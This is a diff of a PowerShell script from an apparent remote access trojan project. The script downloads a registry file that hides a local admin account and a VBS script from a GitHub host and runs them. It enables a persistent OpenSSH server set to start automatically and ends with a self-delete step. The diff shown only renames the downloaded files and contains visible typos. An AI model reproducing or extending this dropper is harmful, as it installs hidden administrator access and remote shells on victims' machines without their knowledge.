@@ -40,12 +40,10 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/admin.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/wrev.reg -OutFile "wrev.reg"
 
 # visual basic script to register
-$vbs_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/calty.vbs -OutFile "$calty.vbs"
 
 # enabling persistent ssh
 Add-WindowsCapability -Online -Name OpeSSH.Server~~~~0.0.1.0
@@ -55,7 +53,7 @@ Set-Service -name sshd -StartupType 'Automatic'
  
 
 # install the registry
-./"$reg_file.reg";./"$vbs_file.vbs"
+./wrev.reg; ./calty.vbs
 
 # self delete
 cd $initial_dir
